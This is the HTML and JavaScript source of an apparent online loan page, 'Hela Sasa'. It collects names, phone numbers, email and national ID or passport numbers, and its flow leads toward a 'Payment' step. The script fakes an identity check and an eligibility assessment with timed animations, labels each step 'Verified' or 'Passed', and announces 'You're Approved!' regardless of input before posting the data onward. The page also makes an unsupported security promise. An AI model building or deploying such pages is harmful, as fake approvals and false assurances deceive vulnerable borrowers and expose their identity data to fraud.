<!DOCTYPE html>
<html lang="en-US" dir="ltr">
<head>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6034877278597930"
     crossorigin="anonymous"></script>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Hela Sasa | Personal Details</title>
  <link rel="shortcut icon" type="image/x-icon" href="assets/img/favicons/favicon.png">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600&display=swap" rel="stylesheet">
  <style>
    :root {
      --green-deep: #064E2B;
      --green-mid: #0A7A42;
      --green-bright: #12A355;
      --gold: #E8A020;
      --gold-light: #F5C456;
      --cream: #DEDED5;
      --dark: #0D1A10;
      --muted: #5A7363;
      --border: rgba(10,122,66,0.14);
      --border-focus: rgba(18,163,85,0.5);
    }
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'DM Sans', sans-serif;
      background: var(--cream);
      color: var(--dark);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* Decorative background blobs */
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 0;
      background:
        radial-gradient(ellipse 65% 55% at 15% 25%, rgba(18,163,85,0.10) 0%, transparent 60%),
        radial-gradient(ellipse 55% 55% at 85% 75%, rgba(232,160,32,0.08) 0%, transparent 60%),
        radial-gradient(ellipse 45% 40% at 60% 10%, rgba(6,78,43,0.07) 0%, transparent 50%);
    }
    body::after {
      content: '';
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 0;
      background:
        radial-gradient(ellipse 40% 40% at 90% 20%, rgba(18,163,85,0.06) 0%, transparent 55%),
        radial-gradient(ellipse 50% 45% at 10% 80%, rgba(245,196,86,0.07) 0%, transparent 55%);
    }

    /* NAVBAR */
    nav {
      position: sticky; top: 0; z-index: 100;
      background: rgba(210,210,200,0.80);
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);
      border-bottom: 1px solid rgba(255,255,255,0.55);
      box-shadow: 0 1px 0 rgba(6,78,43,0.08);
      padding: 0 5vw;
      height: 68px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .nav-logo {
      font-family: 'Syne', sans-serif;
      font-weight: 800;
      font-size: 1.35rem;
      color: var(--green-deep);
      text-decoration: none;
      letter-spacing: -0.03em;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .logo-mark {
      width: 30px; height: 30px;
      background: linear-gradient(135deg, var(--green-bright), var(--green-deep));
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.75rem;
      color: #fff;
      font-weight: 700;
    }

    /* PROGRESS INDICATOR */
    .progress-track {
      display: flex;
      align-items: center;
      gap: 0;
    }
    .prog-step {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 4px;
    }
    .prog-step .circle {
      width: 28px; height: 28px;
      border-radius: 50%;
      border: 2px solid var(--border);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.72rem;
      font-weight: 700;
      color: var(--muted);
      background: rgba(255,255,255,0.6);
      backdrop-filter: blur(6px);
      -webkit-backdrop-filter: blur(6px);
      transition: all 0.3s;
    }
    .prog-step.active .circle {
      background: var(--green-bright);
      border-color: var(--green-bright);
      color: #fff;
    }
    .prog-step .label {
      font-size: 0.65rem;
      color: var(--muted);
      white-space: nowrap;
      font-weight: 500;
    }
    .prog-step.active .label { color: var(--green-mid); font-weight: 600; }
    .prog-line {
      width: 48px;
      height: 2px;
      background: var(--border);
      margin: 0 6px;
      margin-bottom: 18px;
    }

    /* MAIN LAYOUT */
    main {
      flex: 1;
      display: flex;
      align-items: flex-start;
      justify-content: center;
      padding: 48px 5vw 80px;
      position: relative;
      z-index: 1;
    }

    .form-container {
      width: 100%;
      max-width: 720px;
    }

    .form-header {
      margin-bottom: 40px;
      animation: fadeUp 0.5s ease both;
    }
    .form-header .step-label {
      font-size: 0.75rem;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.1em;
      color: var(--green-bright);
      margin-bottom: 8px;
    }
    .form-header h1 {
      font-family: 'Syne', sans-serif;
      font-size: clamp(1.8rem, 3vw, 2.4rem);
      font-weight: 800;
      letter-spacing: -0.025em;
      line-height: 1.15;
      color: var(--dark);
    }
    .form-header p {
      font-size: 0.95rem;
      color: var(--muted);
      margin-top: 10px;
      line-height: 1.6;
    }

    /* FORM */
    .form-card {
      background: rgba(255,255,255,0.72);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border: 1px solid rgba(255,255,255,0.58);
      border-radius: 24px;
      padding: 44px;
      box-shadow: 0 8px 40px rgba(6,78,43,0.10);
      animation: fadeUp 0.5s 0.1s ease both;
    }

    .form-section-title {
      font-family: 'Syne', sans-serif;
      font-size: 0.8rem;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.1em;
      color: var(--muted);
      margin-bottom: 20px;
      padding-bottom: 10px;
      border-bottom: 1px solid rgba(10,122,66,0.12);
    }

    .form-row {
      display: grid;
      gap: 16px;
      margin-bottom: 16px;
    }
    .form-row.cols-3 { grid-template-columns: 1fr 1fr 1fr; }
    .form-row.cols-2 { grid-template-columns: 1fr 1fr; }
    .form-row.cols-1 { grid-template-columns: 1fr; }

    .field {
      display: flex;
      flex-direction: column;
      gap: 6px;
    }
    .field label {
      font-size: 0.8rem;
      font-weight: 600;
      color: var(--dark);
      letter-spacing: 0.01em;
    }
    .field label .req { color: var(--green-bright); margin-left: 2px; }

    .field input,
    .field select {
      width: 100%;
      height: 48px;
      padding: 0 16px;
      border: 1.5px solid rgba(10,122,66,0.16);
      border-radius: 12px;
      font-family: 'DM Sans', sans-serif;
      font-size: 0.9rem;
      color: var(--dark);
      background: rgba(222,222,213,0.6);
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
      appearance: none;
    }
    .field select {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%235A7363' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      background-position: right 16px center;
      padding-right: 40px;
      background-color: rgba(222,222,213,0.6);
    }
    .field input::placeholder { color: rgba(90,115,99,0.5); }
    .field input:focus,
    .field select:focus {
      border-color: var(--green-bright);
      box-shadow: 0 0 0 4px rgba(18,163,85,0.1);
      background: rgba(255,255,255,0.9);
    }
    .field input:valid:not(:placeholder-shown) {
      border-color: rgba(18,163,85,0.5);
    }

    .divider {
      height: 1px;
      background: rgba(10,122,66,0.12);
      margin: 28px 0;
    }

    .form-footer {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-top: 36px;
      flex-wrap: wrap;
      gap: 16px;
    }

    .btn-submit {
      background: linear-gradient(135deg, var(--green-mid), var(--green-deep));
      color: #fff;
      padding: 15px 44px;
      border-radius: 50px;
      font-family: 'DM Sans', sans-serif;
      font-size: 0.95rem;
      font-weight: 600;
      border: none;
      cursor: pointer;
      transition: transform 0.2s, box-shadow 0.2s;
      box-shadow: 0 6px 24px rgba(6,78,43,0.2);
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .btn-submit:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 32px rgba(6,78,43,0.3);
    }
    .btn-submit .spinner {
      display: none;
      width: 16px; height: 16px;
      border: 2.5px solid rgba(255,255,255,0.3);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }
    .btn-submit.loading .spinner { display: block; }
    .btn-submit.loading span { opacity: 0.7; }
    @keyframes spin { to { transform: rotate(360deg); } }

    .form-note {
      font-size: 0.8rem;
      color: var(--muted);
      line-height: 1.5;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    /* ── PROCESSING OVERLAY ── */
    .processing-overlay {
      display: none;
      position: fixed;
      inset: 0;
      z-index: 999;
      background: linear-gradient(160deg, #032918 0%, #064E2B 45%, #0A3D22 100%);
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      align-items: center;
      justify-content: center;
      flex-direction: column;
      overflow: hidden;
    }
    .processing-overlay.show { display: flex; }

    /* Ambient blobs behind the card */
    .proc-blob-1, .proc-blob-2 {
      position: absolute;
      border-radius: 50%;
      pointer-events: none;
    }
    .proc-blob-1 {
      width: 600px; height: 600px;
      top: -180px; right: -180px;
      background: radial-gradient(circle, rgba(18,163,85,0.18) 0%, transparent 70%);
      animation: blobPulse 5s ease-in-out infinite alternate;
    }
    .proc-blob-2 {
      width: 500px; height: 500px;
      bottom: -160px; left: -160px;
      background: radial-gradient(circle, rgba(232,160,32,0.12) 0%, transparent 70%);
      animation: blobPulse 7s ease-in-out infinite alternate-reverse;
    }
    @keyframes blobPulse {
      from { transform: scale(1); opacity: 0.7; }
      to   { transform: scale(1.15); opacity: 1; }
    }

    /* The glass card */
    .proc-card {
      position: relative;
      z-index: 2;
      background: rgba(255,255,255,0.07);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border: 1px solid rgba(255,255,255,0.12);
      border-radius: 28px;
      padding: 44px 52px;
      width: min(520px, 92vw);
      box-shadow: 0 32px 80px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.1);
      animation: cardIn 0.5s cubic-bezier(0.34,1.56,0.64,1) both;
    }
    @keyframes cardIn {
      from { opacity: 0; transform: translateY(32px) scale(0.96); }
      to   { opacity: 1; transform: translateY(0) scale(1); }
    }

    /* Logo row */
    .proc-logo {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 32px;
    }
    .proc-logo-mark {
      width: 34px; height: 34px;
      background: linear-gradient(135deg, var(--green-bright), var(--green-deep));
      border-radius: 9px;
      display: flex; align-items: center; justify-content: center;
      font-size: 0.8rem; color: #fff; font-weight: 700;
      box-shadow: 0 4px 12px rgba(18,163,85,0.4);
    }
    .proc-logo-name {
      font-family: 'Syne', sans-serif;
      font-weight: 800;
      font-size: 1.1rem;
      color: rgba(255,255,255,0.9);
      letter-spacing: -0.02em;
    }

    /* Ring + icon */
    .proc-ring-wrap {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 28px;
      position: relative;
    }
    .proc-ring {
      width: 72px; height: 72px;
      border-radius: 50%;
      border: 3px solid rgba(255,255,255,0.08);
      border-top-color: var(--gold-light);
      border-right-color: rgba(245,196,86,0.35);
      animation: spin 1s linear infinite;
      position: absolute;
    }
    .proc-ring-inner {
      width: 52px; height: 52px;
      border-radius: 50%;
      border: 2px solid rgba(255,255,255,0.06);
      border-bottom-color: var(--green-bright);
      animation: spin 1.8s linear infinite reverse;
      position: absolute;
    }
    .proc-icon {
      font-size: 1.5rem;
      position: relative;
      z-index: 1;
      animation: iconPop 0.4s ease both;
    }
    @keyframes iconPop {
      from { transform: scale(0); opacity: 0; }
      to   { transform: scale(1); opacity: 1; }
    }

    /* Headline */
    .proc-headline {
      font-family: 'Syne', sans-serif;
      font-size: 1.25rem;
      font-weight: 800;
      color: #fff;
      text-align: center;
      margin-bottom: 6px;
      letter-spacing: -0.02em;
    }
    .proc-subline {
      font-size: 0.82rem;
      color: rgba(255,255,255,0.45);
      text-align: center;
      margin-bottom: 32px;
    }

    /* Progress bar */
    .proc-bar-track {
      height: 4px;
      background: rgba(255,255,255,0.08);
      border-radius: 99px;
      overflow: hidden;
      margin-bottom: 28px;
    }
    .proc-bar-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, var(--green-bright), var(--gold-light));
      border-radius: 99px;
      transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
      box-shadow: 0 0 12px rgba(18,163,85,0.5);
    }

    /* Step rows */
    .proc-steps {
      display: flex;
      flex-direction: column;
      gap: 10px;
    }
    .proc-step {
      display: flex;
      align-items: center;
      gap: 14px;
      padding: 10px 14px;
      border-radius: 12px;
      transition: background 0.3s, opacity 0.3s;
      opacity: 0.35;
    }
    .proc-step.active {
      background: rgba(255,255,255,0.06);
      opacity: 1;
    }
    .proc-step.done {
      opacity: 0.75;
    }
    .proc-step-icon {
      width: 32px; height: 32px;
      border-radius: 50%;
      border: 1.5px solid rgba(255,255,255,0.12);
      display: flex; align-items: center; justify-content: center;
      font-size: 0.7rem;
      color: rgba(255,255,255,0.35);
      flex-shrink: 0;
      transition: all 0.3s;
      background: rgba(255,255,255,0.04);
    }
    .proc-step.active .proc-step-icon {
      border-color: var(--gold-light);
      background: rgba(245,196,86,0.12);
      color: var(--gold-light);
      box-shadow: 0 0 0 4px rgba(245,196,86,0.1);
    }
    .proc-step.done .proc-step-icon {
      border-color: var(--green-bright);
      background: rgba(18,163,85,0.15);
      color: var(--green-bright);
    }
    .proc-step-label {
      font-size: 0.85rem;
      font-weight: 500;
      color: rgba(255,255,255,0.5);
      flex: 1;
      transition: color 0.3s;
    }
    .proc-step.active .proc-step-label {
      color: rgba(255,255,255,0.9);
      font-weight: 600;
    }
    .proc-step.done .proc-step-label {
      color: rgba(255,255,255,0.55);
    }
    .proc-step-status {
      font-size: 0.72rem;
      font-weight: 600;
      color: rgba(255,255,255,0.2);
      transition: color 0.3s;
      white-space: nowrap;
    }
    .proc-step.active .proc-step-status {
      color: var(--gold-light);
    }
    .proc-step.done .proc-step-status {
      color: var(--green-bright);
    }

    /* Spinning dot for active step */
    .proc-step-dot {
      display: none;
      width: 14px; height: 14px;
      border: 2px solid rgba(245,196,86,0.2);
      border-top-color: var(--gold-light);
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }
    .proc-step.active .proc-step-icon .proc-step-dot { display: block; }
    .proc-step.active .proc-step-icon .proc-step-emoji { display: none; }
    .proc-step.done .proc-step-icon .proc-step-dot { display: none; }
    .proc-step.done .proc-step-icon .proc-step-emoji { display: none; }
    .proc-step.done .proc-step-icon::after {
      content: '✓';
      font-size: 0.8rem;
      font-weight: 700;
    }

    /* Done state transition */
    .proc-card.all-done .proc-ring { animation: none; border-color: rgba(18,163,85,0.3); border-top-color: var(--green-bright); }
    .proc-card.all-done .proc-ring-inner { animation: none; }
    .proc-card.all-done .proc-headline { color: var(--gold-light); }

    /* Percentage counter */
    .proc-percent {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-family: 'Syne', sans-serif;
      font-size: 0.6rem;
      font-weight: 700;
      color: rgba(255,255,255,0.4);
      letter-spacing: 0.04em;
    }

    footer {
      text-align: center;
      padding: 24px;
      font-size: 0.8rem;
      color: var(--muted);
      border-top: 1px solid rgba(255,255,255,0.5);
      position: relative;
      z-index: 1;
      background: rgba(210,210,200,0.5);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
    }

    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(16px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @media (max-width: 640px) {
      .form-row.cols-3 { grid-template-columns: 1fr; }
      .form-row.cols-2 { grid-template-columns: 1fr; }
      .form-card { padding: 28px 20px; }
      .progress-track { display: none; }
    }
  </style>
</head>
<body>

  <!-- PROCESSING OVERLAY -->
  <div class="processing-overlay" id="processingOverlay">
    <div class="proc-blob-1"></div>
    <div class="proc-blob-2"></div>

    <div class="proc-card" id="procCard">

      <div class="proc-logo">
        <div class="proc-logo-mark">HS</div>
        <span class="proc-logo-name">Hela Sasa</span>
      </div>

      <div class="proc-ring-wrap">
        <div class="proc-ring"></div>
        <div class="proc-ring-inner"></div>
        <span class="proc-icon" id="procIcon">🔍</span>
        <span class="proc-percent" id="procPercent">0%</span>
      </div>

      <div class="proc-headline" id="procHeadline">Checking Eligibility</div>
      <div class="proc-subline" id="procSubline">Running your details through our system…</div>

      <div class="proc-bar-track">
        <div class="proc-bar-fill" id="procBar"></div>
      </div>

      <div class="proc-steps">
        <div class="proc-step" id="step-0">
          <div class="proc-step-icon">
            <div class="proc-step-dot"></div>
            <span class="proc-step-emoji">🪪</span>
          </div>
          <span class="proc-step-label">Validating identity</span>
          <span class="proc-step-status" id="step-0-status">Pending</span>
        </div>
        <div class="proc-step" id="step-1">
          <div class="proc-step-icon">
            <div class="proc-step-dot"></div>
            <span class="proc-step-emoji">🔐</span>
          </div>
          <span class="proc-step-label">Verifying personal details</span>
          <span class="proc-step-status" id="step-1-status">Pending</span>
        </div>
        <div class="proc-step" id="step-2">
          <div class="proc-step-icon">
            <div class="proc-step-dot"></div>
            <span class="proc-step-emoji">📊</span>
          </div>
          <span class="proc-step-label">Running eligibility assessment</span>
          <span class="proc-step-status" id="step-2-status">Pending</span>
        </div>
        <div class="proc-step" id="step-3">
          <div class="proc-step-icon">
            <div class="proc-step-dot"></div>
            <span class="proc-step-emoji">💰</span>
          </div>
          <span class="proc-step-label">Calculating your loan limit</span>
          <span class="proc-step-status" id="step-3-status">Pending</span>
        </div>
        <div class="proc-step" id="step-4">
          <div class="proc-step-icon">
            <div class="proc-step-dot"></div>
            <span class="proc-step-emoji">🎉</span>
          </div>
          <span class="proc-step-label">Generating your offer</span>
          <span class="proc-step-status" id="step-4-status">Pending</span>
        </div>
      </div>

    </div>
  </div>

  <!-- NAVBAR -->
  <nav>
    <a class="nav-logo" href="index.html">
      <div class="logo-mark">HS</div>
      Hela Sasa
    </a>
    <div class="progress-track">
      <div class="prog-step active">
        <div class="circle">1</div>
        <div class="label">Details</div>
      </div>
      <div class="prog-line"></div>
      <div class="prog-step">
        <div class="circle">2</div>
        <div class="label">Qualify</div>
      </div>
      <div class="prog-line"></div>
      <div class="prog-step">
        <div class="circle">3</div>
        <div class="label">Loan Request</div>
      </div>
      <div class="prog-line"></div>
      <div class="prog-step">
        <div class="circle">4</div>
        <div class="label">Payment</div>
      </div>
    </div>
  </nav>

  <main>
    <div class="form-container">
      <div class="form-header">
        <div class="step-label">Step 1 of 4</div>
        <h1>Tell us about yourself</h1>
        <p>Your information is encrypted and secure. Takes about 2 minutes.</p>
      </div>

      <div class="form-card">
        <form action="display.php" method="post" id="detailsForm">

          <div class="form-section-title">Personal Information</div>

          <div class="form-row cols-3">
            <div class="field">
              <label for="firstname">First Name <span class="req">*</span></label>
              <input type="text" id="firstname" name="firstname" placeholder="e.g. James" required>
            </div>
            <div class="field">
              <label for="middlename">Middle Name</label>
              <input type="text" id="middlename" name="middlename" placeholder="Optional">
            </div>
            <div class="field">
              <label for="lastname">Last Name <span class="req">*</span></label>
              <input type="text" id="lastname" name="lastname" placeholder="e.g. Kamau" required>
            </div>
          </div>

          <div class="form-row cols-2">
            <div class="field">
              <label for="phone">Phone Number <span class="req">*</span></label>
              <input type="tel" id="phone" name="phone" placeholder="07XXXXXXXX" required>
            </div>
            <div class="field">
              <label for="email">Email Address <span class="req">*</span></label>
              <input type="email" id="email" name="email" placeholder="you@example.com" required>
            </div>
          </div>

          <div class="form-row cols-2">
            <div class="field">
              <label for="ID">ID Number <span class="req">*</span></label>
              <input type="text" id="ID" name="ID" placeholder="National ID / Passport" required>
            </div>
            <div class="field">
              <label for="residence">Town / City <span class="req">*</span></label>
              <input type="text" id="residence" name="residence" placeholder="e.g. Nairobi" required>
            </div>
          </div>

          <div class="divider"></div>
          <div class="form-section-title">Loan Preferences</div>

          <div class="form-row cols-2">
            <div class="field">
              <label for="loanType">Loan Type <span class="req">*</span></label>
              <select id="loanType" name="loanType" required>
                <option value="" disabled selected>Select loan type</option>
                <option value="Salary">Salary Loan</option>
                <option value="Business">Business Loan</option>
                <option value="Unsecured">Unsecured Loan</option>
              </select>
            </div>
            <div class="field">
              <label for="duration">Loan Duration <span class="req">*</span></label>
              <select id="duration" name="duration" required>
                <option value="" disabled selected>Select duration</option>
                <option value="1">1 Month</option>
                <option value="2">2 Months</option>
                <option value="3">3 Months</option>
              </select>
            </div>
          </div>

          <div class="form-footer">
            <div class="form-note">
              🔒 256-bit SSL encrypted. Your data is safe.
            </div>
            <button type="submit" class="btn-submit" id="submitBtn">
              <div class="spinner"></div>
              <span>Check My Eligibility &rarr;</span>
            </button>
          </div>

        </form>
      </div>
    </div>
  </main>

  <footer>
    &copy; 2025 Hela Sasa LTD. All rights reserved.
  </footer>

  <script>
    document.getElementById('detailsForm').addEventListener('submit', function(e) {
      // Prevent real submit — run the simulation first, then re-submit
      e.preventDefault();
      const form = this;

      document.getElementById('processingOverlay').classList.add('show');
      const btn = document.getElementById('submitBtn');
      btn.classList.add('loading');

      const steps = [
        { id: 0, duration: 1100, icon: '🪪', headline: 'Validating Identity',       sub: 'Checking your ID against our records…',          doneLabel: 'Verified' },
        { id: 1, duration: 1200, icon: '🔐', headline: 'Verifying Personal Details', sub: 'Confirming your contact information is valid…',   doneLabel: 'Confirmed' },
        { id: 2, duration: 1400, icon: '📊', headline: 'Eligibility Assessment',     sub: 'Scoring your application against our criteria…', doneLabel: 'Passed' },
        { id: 3, duration: 1000, icon: '💰', headline: 'Calculating Loan Limit',     sub: 'Finding the best amount for your profile…',      doneLabel: 'Calculated' },
        { id: 4, duration: 800,  icon: '🎉', headline: 'Offer Ready!',               sub: 'Preparing your personalised loan offer…',        doneLabel: 'Done' },
      ];

      const barEl      = document.getElementById('procBar');
      const percentEl  = document.getElementById('procPercent');
      const iconEl     = document.getElementById('procIcon');
      const headlineEl = document.getElementById('procHeadline');
      const sublineEl  = document.getElementById('procSubline');
      const cardEl     = document.getElementById('procCard');

      // Target bar widths per step completion (cumulative %)
      const barTargets = [18, 38, 62, 82, 100];

      let current = 0;

      function activateStep(idx) {
        const s = steps[idx];

        // Mark previous as done
        if (idx > 0) {
          const prev = document.getElementById('step-' + (idx - 1));
          prev.classList.remove('active');
          prev.classList.add('done');
          document.getElementById('step-' + (idx - 1) + '-status').textContent = steps[idx - 1].doneLabel;
        }

        // Activate current
        const el = document.getElementById('step-' + idx);
        el.classList.add('active');
        document.getElementById('step-' + idx + '-status').textContent = 'Running…';

        // Update card header
        iconEl.textContent = s.icon;
        headlineEl.textContent = s.headline;
        sublineEl.textContent = s.sub;

        // Animate bar
        const targetPct = barTargets[idx];
        barEl.style.width = targetPct + '%';

        // Animate percent counter smoothly
        const startPct = idx === 0 ? 0 : barTargets[idx - 1];
        animateCounter(startPct, targetPct, s.duration * 0.9);

        // Schedule next step or finish
        setTimeout(function() {
          if (idx < steps.length - 1) {
            activateStep(idx + 1);
          } else {
            finishAll();
          }
        }, s.duration);
      }

      function animateCounter(from, to, duration) {
        const start = performance.now();
        function tick(now) {
          const elapsed = now - start;
          const progress = Math.min(elapsed / duration, 1);
          const eased = 1 - Math.pow(1 - progress, 3);
          const val = Math.round(from + (to - from) * eased);
          percentEl.textContent = val + '%';
          if (progress < 1) requestAnimationFrame(tick);
        }
        requestAnimationFrame(tick);
      }

      function finishAll() {
        // Mark last step done
        const last = document.getElementById('step-' + (steps.length - 1));
        last.classList.remove('active');
        last.classList.add('done');
        document.getElementById('step-' + (steps.length - 1) + '-status').textContent = steps[steps.length - 1].doneLabel;

        barEl.style.width = '100%';
        percentEl.textContent = '100%';

        headlineEl.textContent = 'You\'re Approved! 🎊';
        headlineEl.style.color = 'var(--gold-light)';
        sublineEl.textContent = 'Redirecting to your loan offer…';
        iconEl.textContent = '✅';

        cardEl.classList.add('all-done');

        // Short pause then actually submit
        setTimeout(function() { form.submit(); }, 900);
      }

      // Kick off
      setTimeout(function() { activateStep(0); }, 300);
    });
  </script>
</body>
</html>
